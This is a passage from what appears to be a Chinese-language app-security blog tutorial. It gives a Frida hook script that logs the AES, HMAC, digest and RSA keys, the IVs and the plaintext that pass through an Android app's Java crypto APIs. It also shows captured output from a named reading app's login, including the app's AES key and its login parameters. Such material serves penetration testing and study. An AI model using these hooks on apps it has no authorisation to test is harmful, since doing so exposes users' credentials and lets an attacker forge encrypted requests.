class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"> </span><br><span class="line">jsCode = <span class="string">"""</span></span><br><span class="line"><span class="string">function showStacks() &#123;</span></span><br><span class="line"><span class="string">    Java.perform(function() &#123;</span></span><br><span class="line"><span class="string">        send(Java.use("android.util.Log").getStackTraceString(Java.use("java.lang.Exception").$new()));</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function bytesToHex(arr) &#123;</span></span><br><span class="line"><span class="string">    var str = "";</span></span><br><span class="line"><span class="string">    for (var i = 0; i &lt; arr.length; i++) &#123;</span></span><br><span class="line"><span class="string">        var tmp = arr[i];</span></span><br><span class="line"><span class="string">        if (tmp &lt; 0) &#123;</span></span><br><span class="line"><span class="string">            tmp = (255 + tmp + 1).toString(16);</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            tmp = tmp.toString(16);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        if (tmp.length == 1) &#123;</span></span><br><span class="line"><span class="string">            tmp = "0" + tmp;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        str += tmp;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    return str;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">function bytesToBase64(e) &#123;</span></span><br><span class="line"><span class="string">    var base64EncodeChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';</span></span><br><span class="line"><span class="string">    var r, a, c, h, o, t;</span></span><br><span class="line"><span class="string">    for (c = e.length, a = 0, r = ''; a &lt; c;) &#123;</span></span><br><span class="line"><span class="string">        if (h = 255 &amp; e[a++], a == c) &#123;</span></span><br><span class="line"><span class="string">            r += base64EncodeChars.charAt(h &gt;&gt; 2),</span></span><br><span class="line"><span class="string">            r += base64EncodeChars.charAt((3 &amp; h) &lt;&lt; 4),</span></span><br><span class="line"><span class="string">            r += '==';</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        if (o = e[a++], a == c) &#123;</span></span><br><span class="line"><span class="string">            r += base64EncodeChars.charAt(h &gt;&gt; 2),</span></span><br><span class="line"><span class="string">            r += base64EncodeChars.charAt((3 &amp; h) &lt;&lt; 4 | (240 &amp; o) &gt;&gt; 4),</span></span><br><span class="line"><span class="string">            r += base64EncodeChars.charAt((15 &amp; o) &lt;&lt; 2),</span></span><br><span class="line"><span class="string">            r += '=';</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        t = e[a++],</span></span><br><span class="line"><span class="string">        r += base64EncodeChars.charAt(h &gt;&gt; 2),</span></span><br><span class="line"><span class="string">        r += base64EncodeChars.charAt((3 &amp; h) &lt;&lt; 4 | (240 &amp; o) &gt;&gt; 4),</span></span><br><span class="line"><span class="string">        r += base64EncodeChars.charAt((15 &amp; o) &lt;&lt; 2 | (192 &amp; t) &gt;&gt; 6),</span></span><br><span class="line"><span class="string">        r += base64EncodeChars.charAt(63 &amp; t)</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    return r</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">function bytesToString(arr) &#123;</span></span><br><span class="line"><span class="string">    if (typeof arr === 'string') &#123;</span></span><br><span class="line"><span class="string">        return arr;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    var str = '',</span></span><br><span class="line"><span class="string">    _arr = arr;</span></span><br><span class="line"><span class="string">    for (var i = 0; i &lt; _arr.length; i++) &#123;</span></span><br><span class="line"><span class="string">        var one = _arr[i].toString(2),</span></span><br><span class="line"><span class="string">        v = one.match(/^1+?(?=0)/);</span></span><br><span class="line"><span class="string">        if (v &amp;&amp; one.length == 8) &#123;</span></span><br><span class="line"><span class="string">            var bytesLength = v[0].length;</span></span><br><span class="line"><span class="string">            var store = _arr[i].toString(2).slice(7 - bytesLength);</span></span><br><span class="line"><span class="string">            for (var st = 1; st &lt; bytesLength; st++) &#123;</span></span><br><span class="line"><span class="string">                store += _arr[st + i].toString(2).slice(2);</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            str += String.fromCharCode(parseInt(store, 2));</span></span><br><span class="line"><span class="string">            i += bytesLength - 1;</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            str += String.fromCharCode(_arr[i]);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    return str;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">    var secretKeySpec = Java.use('javax.crypto.spec.SecretKeySpec');</span></span><br><span class="line"><span class="string">    secretKeySpec.$init.overload('[B','java.lang.String').implementation = function (a,b) &#123;</span></span><br><span class="line"><span class="string">        showStacks();</span></span><br><span class="line"><span class="string">        var result = this.$init(a, b);</span></span><br><span class="line"><span class="string">        send("======================================");</span></span><br><span class="line"><span class="string">        send("算法名：" + b + "|Dec密钥:" + bytesToString(a));</span></span><br><span class="line"><span class="string">        send("算法名：" + b + "|Hex密钥:" + bytesToHex(a));</span></span><br><span class="line"><span class="string">        return result;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    var mac = Java.use('javax.crypto.Mac');</span></span><br><span class="line"><span class="string">    mac.getInstance.overload('java.lang.String').implementation = function (a) &#123;</span></span><br><span class="line"><span class="string">        showStacks();</span></span><br><span class="line"><span class="string">        var result = this.getInstance(a);</span></span><br><span class="line"><span class="string">        send("======================================");</span></span><br><span class="line"><span class="string">        send("算法名：" + a);</span></span><br><span class="line"><span class="string">        return result;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    mac.update.overload('[B').implementation = function (a) &#123;</span></span><br><span class="line"><span class="string">        showStacks();</span></span><br><span class="line"><span class="string">        this.update(a);</span></span><br><span class="line"><span class="string">        send("======================================");</span></span><br><span class="line"><span class="string">        send("update:" + bytesToString(a))</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    mac.update.overload('[B','int','int').implementation = function (a,b,c) &#123;</span></span><br><span class="line"><span class="string">        showStacks();</span></span><br><span class="line"><span class="string">        this.update(a,b,c)</span></span><br><span class="line"><span class="string">        send("======================================");</span></span><br><span class="line"><span class="string">        send("update:" + bytesToString(a) + "|" + b + "|" + c);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    mac.doFinal.overload().implementation = function () &#123;</span></span><br><span class="line"><span class="string">        showStacks();</span></span><br><span class="line"><span class="string">        var result = this.doFinal();</span></span><br><span class="line"><span class="string">        send("======================================");</span></span><br><span class="line"><span class="string">        send("doFinal结果(hex):" + bytesToHex(result));</span></span><br><span class="line"><span class="string">        send("doFinal结果(base64):" + bytesToBase64(result));</span></span><br><span class="line"><span class="string">        return result;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    mac.doFinal.overload('[B').implementation = function (a) &#123;</span></span><br><span class="line"><span class="string">        showStacks();</span></span><br><span class="line"><span class="string">        var result = this.doFinal(a);</span></span><br><span class="line"><span class="string">        send("======================================");</span></span><br><span class="line"><span class="string">        send("doFinal参数:" + bytesToString(a));</span></span><br><span class="line"><span class="string">        send("doFinal结果(hex):" + bytesToHex(result));</span></span><br><span class="line"><span class="string">        send("doFinal结果(base):" + bytesToBase64(result));</span></span><br><span class="line"><span class="string">        return result;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">        var md = Java.use('java.security.MessageDigest');</span></span><br><span class="line"><span class="string">    md.getInstance.overload('java.lang.String','java.lang.String').implementation = function (a,b) &#123;</span></span><br><span class="line"><span class="string">        showStacks();</span></span><br><span class="line"><span class="string">        send("======================================");</span></span><br><span class="line"><span class="string">        send("算法名：" + a);</span></span><br><span class="line"><span class="string">        return this.getInstance(a, b);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    md.getInstance.overload('java.lang.String').implementation = function (a) &#123;</span></span><br><span class="line"><span class="string">        showStacks();</span></span><br><span class="line"><span class="string">        send("======================================");</span></span><br><span class="line"><span class="string">        send("算法名：" + a);</span></span><br><span class="line"><span class="string">        return this.getInstance(a);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    md.update.overload('[B').implementation = function (a) &#123;</span></span><br><span class="line"><span class="string">        showStacks();</span></span><br><span class="line"><span class="string">        send("======================================");</span></span><br><span class="line"><span class="string">        send("update:" + bytesToString(a))</span></span><br><span class="line"><span class="string">        return this.update(a);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    md.update.overload('[B','int','int').implementation = function (a,b,c) &#123;</span></span><br><span class="line"><span class="string">        showStacks();</span></span><br><span class="line"><span class="string">        send("======================================");</span></span><br><span class="line"><span class="string">        send("update:" + bytesToString(a) + "|" + b + "|" + c);</span></span><br><span class="line"><span class="string">        return this.update(a,b,c);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    md.digest.overload().implementation = function () &#123;</span></span><br><span class="line"><span class="string">        showStacks();</span></span><br><span class="line"><span class="string">        send("======================================");</span></span><br><span class="line"><span class="string">        var result = this.digest();</span></span><br><span class="line"><span class="string">        send("digest结果(hex):" + bytesToHex(result));</span></span><br><span class="line"><span class="string">        send("digest结果(base64):" + bytesToBase64(result));</span></span><br><span class="line"><span class="string">        return result;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    md.digest.overload('[B').implementation = function (a) &#123;</span></span><br><span class="line"><span class="string">        showStacks();</span></span><br><span class="line"><span class="string">        send("======================================");</span></span><br><span class="line"><span class="string">        send("digest参数:" + bytesToString(a));</span></span><br><span class="line"><span class="string">        var result = this.digest(a);</span></span><br><span class="line"><span class="string">        send("digest结果(hex):" + bytesToHex(result));</span></span><br><span class="line"><span class="string">        send("digest结果(base64):" + bytesToBase64(result));</span></span><br><span class="line"><span class="string">        return result;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">        var ivParameterSpec = Java.use('javax.crypto.spec.IvParameterSpec');</span></span><br><span class="line"><span class="string">    ivParameterSpec.$init.overload('[B').implementation = function (a) &#123;</span></span><br><span class="line"><span class="string">        showStacks();</span></span><br><span class="line"><span class="string">        var result = this.$init(a);</span></span><br><span class="line"><span class="string">        send("======================================");</span></span><br><span class="line"><span class="string">        send("iv向量:" + bytesToString(a));</span></span><br><span class="line"><span class="string">        send("iv向量(hex):" + bytesToHex(a));</span></span><br><span class="line"><span class="string">        return result;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    var cipher = Java.use('javax.crypto.Cipher');</span></span><br><span class="line"><span class="string">    cipher.getInstance.overload('java.lang.String').implementation = function (a) &#123;</span></span><br><span class="line"><span class="string">        showStacks();</span></span><br><span class="line"><span class="string">        var result = this.getInstance(a);</span></span><br><span class="line"><span class="string">        send("======================================");</span></span><br><span class="line"><span class="string">        send("模式填充:" + a);</span></span><br><span class="line"><span class="string">        return result;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    cipher.update.overload('[B').implementation = function (a) &#123;</span></span><br><span class="line"><span class="string">        showStacks();</span></span><br><span class="line"><span class="string">        var result = this.update(a);</span></span><br><span class="line"><span class="string">        send("======================================");</span></span><br><span class="line"><span class="string">        send("update:" + bytesToString(a));</span></span><br><span class="line"><span class="string">        return result;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    cipher.update.overload('[B','int','int').implementation = function (a,b,c) &#123;</span></span><br><span class="line"><span class="string">        showStacks();</span></span><br><span class="line"><span class="string">        var result = this.update(a,b,c);</span></span><br><span class="line"><span class="string">        send("======================================");</span></span><br><span class="line"><span class="string">        send("update:" + bytesToString(a) + "|" + b + "|" + c);</span></span><br><span class="line"><span class="string">        return result;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    cipher.doFinal.overload().implementation = function () &#123;</span></span><br><span class="line"><span class="string">        showStacks();</span></span><br><span class="line"><span class="string">        var result = this.doFinal();</span></span><br><span class="line"><span class="string">        send("======================================");</span></span><br><span class="line"><span class="string">        send("doFinal结果(hex):" + bytesToHex(result));</span></span><br><span class="line"><span class="string">        send("doFinal结果(base64):" + bytesToBase64(result));</span></span><br><span class="line"><span class="string">        return result;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    cipher.doFinal.overload('[B').implementation = function (a) &#123;</span></span><br><span class="line"><span class="string">        showStacks();</span></span><br><span class="line"><span class="string">        var result = this.doFinal(a);</span></span><br><span class="line"><span class="string">        send("======================================");</span></span><br><span class="line"><span class="string">        send("doFinal参数:" + bytesToString(a));</span></span><br><span class="line"><span class="string">        send("doFinal结果(hex):" + bytesToHex(result));</span></span><br><span class="line"><span class="string">        send("doFinal结果(base64):" + bytesToBase64(result));</span></span><br><span class="line"><span class="string">        return result;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    var x509EncodedKeySpec = Java.use('java.security.spec.X509EncodedKeySpec');</span></span><br><span class="line"><span class="string">    x509EncodedKeySpec.$init.overload('[B').implementation = function (a) &#123;</span></span><br><span class="line"><span class="string">        showStacks();</span></span><br><span class="line"><span class="string">        var result = this.$init(a);</span></span><br><span class="line"><span class="string">        send("======================================");</span></span><br><span class="line"><span class="string">        send("RSA密钥:" + bytesToBase64(a));</span></span><br><span class="line"><span class="string">        return result;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    var rSAPublicKeySpec = Java.use('java.security.spec.RSAPublicKeySpec');</span></span><br><span class="line"><span class="string">    rSAPublicKeySpec.$init.overload('java.math.BigInteger','java.math.BigInteger').implementation = function (a,b) &#123;</span></span><br><span class="line"><span class="string">        showStacks();</span></span><br><span class="line"><span class="string">        var result = this.$init(a,b);</span></span><br><span class="line"><span class="string">        send("======================================");</span></span><br><span class="line"><span class="string">        //send("RSA密钥:" + bytesToBase64(a));</span></span><br><span class="line"><span class="string">        send("RSA密钥N:" + a.toString(16));</span></span><br><span class="line"><span class="string">        send("RSA密钥E:" + b.toString(16));</span></span><br><span class="line"><span class="string">        return result;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">"""</span>;</span><br><span class="line"> </span><br><span class="line">fw = open(sys.argv[<span class="number">1</span>],<span class="string">'w+'</span>,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span><span class="params">(message, data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">"type"</span>] == <span class="string">'send'</span>:</span><br><span class="line">        print(<span class="string">u"[*] &#123;0&#125;"</span>.format(message[<span class="string">'payload'</span>]))</span><br><span class="line">        fw.write(<span class="string">u"[*] &#123;0&#125;\n"</span>.format(message[<span class="string">'payload'</span>]))</span><br><span class="line">        fw.flush()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"> </span><br><span class="line">process = frida.get_remote_device().attach(sys.argv[<span class="number">1</span>])</span><br><span class="line">script= process.create_script(jsCode)</span><br><span class="line">script.on(<span class="string">"message"</span>, message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p><code>python frida-hook.py com.faloo.BookReader4Android</code>脚本加上包名，即可hook所有原生方法。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1578403900989.png" alt="1578403900989"></p><p>如图某APP登录处，从<code>burp</code>里的流量记录，流量被加密了，在hook脚本中也打印了该段加密数据。</p><p>该脚本会在同目录下生成同包名的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">[*] ======================================</span><br><span class="line">[*] 算法名：AES|Dec密钥:DD240BF148903189BF8DAE0C220C9591</span><br><span class="line">[*] 算法名：AES|Hex密钥:4444323430424631343839303331383942463844414530433232304339353931</span><br><span class="line">[*] java.lang.Exception</span><br><span class="line">at javax.crypto.Cipher.getInstance(Native Method)</span><br><span class="line">at com.faloo.util.AES.encrypt(Proguard:211)</span><br><span class="line">at com.faloo.util.EncryptUtil._e18(Native Method)</span><br><span class="line">at com.faloo.util.EncryptUtil.getAESEncrypt(Proguard:150)</span><br><span class="line">at com.faloo.network.module.b.a(Proguard:49)</span><br><span class="line">at com.faloo.network.util.e.a(Proguard:174)</span><br><span class="line">at com.faloo.network.service.a.c.a(Proguard:141)</span><br><span class="line">at com.faloo.app.activity.LoginPageActivity$13.a(Proguard:941)</span><br><span class="line">at io.reactivex.internal.operators.observable.ObservableCreate.b(Proguard:40)</span><br><span class="line">at io.reactivex.e.a(Proguard:11194)</span><br><span class="line">at io.reactivex.internal.operators.observable.ObservableSubscribeOn$a.run(Proguard:96)</span><br><span class="line">at io.reactivex.k$a.run(Proguard:463)</span><br><span class="line">at io.reactivex.internal.schedulers.ScheduledRunnable.run(Proguard:66)</span><br><span class="line">at io.reactivex.internal.schedulers.ScheduledRunnable.call(Proguard:57)</span><br><span class="line">at java.util.concurrent.FutureTask.run(FutureTask.java:237)</span><br><span class="line">at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201(ScheduledThreadPoolExecutor.java:152)</span><br><span class="line">at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:265)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1112)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:587)</span><br><span class="line">at java.lang.Thread.run(Thread.java:818)</span><br><span class="line"></span><br><span class="line">[*] ======================================</span><br><span class="line">[*] 模式填充:AES/CBC/PKCS5Padding</span><br><span class="line">[*] java.lang.Exception</span><br><span class="line">at javax.crypto.spec.IvParameterSpec.&lt;init&gt;(Native Method)</span><br><span class="line">at com.faloo.util.AES.encrypt(Proguard:212)</span><br><span class="line">at com.faloo.util.EncryptUtil._e18(Native Method)</span><br><span class="line">at com.faloo.util.EncryptUtil.getAESEncrypt(Proguard:150)</span><br><span class="line">at com.faloo.network.module.b.a(Proguard:49)</span><br><span class="line">at com.faloo.network.util.e.a(Proguard:174)</span><br><span class="line">at com.faloo.network.service.a.c.a(Proguard:141)</span><br><span class="line">at com.faloo.app.activity.LoginPageActivity$13.a(Proguard:941)</span><br><span class="line">at io.reactivex.internal.operators.observable.ObservableCreate.b(Proguard:40)</span><br><span class="line">at io.reactivex.e.a(Proguard:11194)</span><br><span class="line">at io.reactivex.internal.operators.observable.ObservableSubscribeOn$a.run(Proguard:96)</span><br><span class="line">at io.reactivex.k$a.run(Proguard:463)</span><br><span class="line">at io.reactivex.internal.schedulers.ScheduledRunnable.run(Proguard:66)</span><br><span class="line">at io.reactivex.internal.schedulers.ScheduledRunnable.call(Proguard:57)</span><br><span class="line">at java.util.concurrent.FutureTask.run(FutureTask.java:237)</span><br><span class="line">at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201(ScheduledThreadPoolExecutor.java:152)</span><br><span class="line">at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:265)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1112)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:587)</span><br><span class="line">at java.lang.Thread.run(Thread.java:818)</span><br><span class="line"></span><br><span class="line">[*] ======================================</span><br><span class="line">[*] iv向量:                </span><br><span class="line">[*] iv向量(hex):00000000000000000000000000000000</span><br><span class="line">[*] java.lang.Exception</span><br><span class="line">at javax.crypto.Cipher.doFinal(Native Method)</span><br><span class="line">at com.faloo.util.AES.encrypt(Proguard:213)</span><br><span class="line">at com.faloo.util.EncryptUtil._e18(Native Method)</span><br><span class="line">at com.faloo.util.EncryptUtil.getAESEncrypt(Proguard:150)</span><br><span class="line">at com.faloo.network.module.b.a(Proguard:49)</span><br><span class="line">at com.faloo.network.util.e.a(Proguard:174)</span><br><span class="line">at com.faloo.network.service.a.c.a(Proguard:141)</span><br><span class="line">at com.faloo.app.activity.LoginPageActivity$13.a(Proguard:941)</span><br><span class="line">at io.reactivex.internal.operators.observable.ObservableCreate.b(Proguard:40)</span><br><span class="line">at io.reactivex.e.a(Proguard:11194)</span><br><span class="line">at io.reactivex.internal.operators.observable.ObservableSubscribeOn$a.run(Proguard:96)</span><br><span class="line">at io.reactivex.k$a.run(Proguard:463)</span><br><span class="line">at io.reactivex.internal.schedulers.ScheduledRunnable.run(Proguard:66)</span><br><span class="line">at io.reactivex.internal.schedulers.ScheduledRunnable.call(Proguard:57)</span><br><span class="line">at java.util.concurrent.FutureTask.run(FutureTask.java:237)</span><br><span class="line">at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201(ScheduledThreadPoolExecutor.java:152)</span><br><span class="line">at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:265)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1112)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:587)</span><br><span class="line">at java.lang.Thread.run(Thread.java:818)</span><br><span class="line"></span><br><span class="line">[*] ======================================</span><br><span class="line">[*] doFinal参数:num=0&amp;userid=1388888888&amp;Password=9c9c5f3bff756cf5395265b6c5f0d8f0&amp;tid=2&amp;ts=1578400865589&amp;nonce=fb4f89a9464e3a318111b337f92a9f1c&amp;resign=e8ca11ce1d27aa18ed6840617b8cbcf7&amp;pwdcode=YTEyMzQ1Ng==</span><br><span class="line">&amp;time=2020-01-07 21:31:33&amp;wt=1&amp;uuid=77a0332f1ca14daf9337f941bcc86e70&amp;appversion=3.4.8&amp;Type=Android&amp;xp=0</span><br><span class="line">[*] doFinal结果(hex):5a2439af1041cdd1bd1df38a9d6107932190b83cf6be7610cc54767ee4c97bb6236dc4e9d4b00e7408b9add01d8f9423eebd8d75386c20c1c84f8751104f50c9408f2b28af82d3eab9c56b442984c399d65581bdf68815dea6430166767e8538ba7349846e87ed1322b79066e7dac527587c0c7d9950046e63a87af64ce479e5113fcdfe3f35d0a40f8bdc917142d943ad0224bf0315c967fb969abb2178a1c764e311c67aaaebd6d69362a7fdf2bb64040db54443572fa897cd1733ef9dcd4733a35881083082ebdd2cc41a8d169de824b621e73445b3a5004fccd4b091095f0f2c2efc87116f82723c6e59c7c379c2a0eeeecb6c0deefdda2b1581b5a0e56c7ba7f1eaca8f59acae5a2e5c24d5dc72736a1fc1c0cb7e68336b3365ad250e00f89ba09971403c2ed265a2cd62a9fdc4</span><br><span class="line">[*] doFinal结果(base64):WiQ5rxBBzdG9HfOKnWEHkyGQuDz2vnYQzFR2fuTJe7YjbcTp1LAOdAi5rdAdj5Qj7r2NdThsIMHIT4dREE9QyUCPKyivgtPqucVrRCmEw5nWVYG99ogV3qZDAWZ2foU4unNJhG6H7RMit5Bm59rFJ1h8DH2ZUARuY6h69kzkeeURP83+PzXQpA+L3JFxQtlDrQIkvwMVyWf7lpq7IXihx2TjEcZ6quvW1pNip/3yu2QEDbVEQ1cvqJfNFzPvnc1HM6NYgQgwguvdLMQajRad6CS2Iec0RbOlAE/M1LCRCV8PLC78hxFvgnI8blnHw3nCoO7uy2wN7v3aKxWBtaDlbHun8erKj1msrlouXCTV3HJzah/BwMt+aDNrM2WtJQ4A+JugmXFAPC7SZaLNYqn9xA==</span><br></pre></td></tr></table></figure><p>如下数据是最终加密的结果，即发给服务器的数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 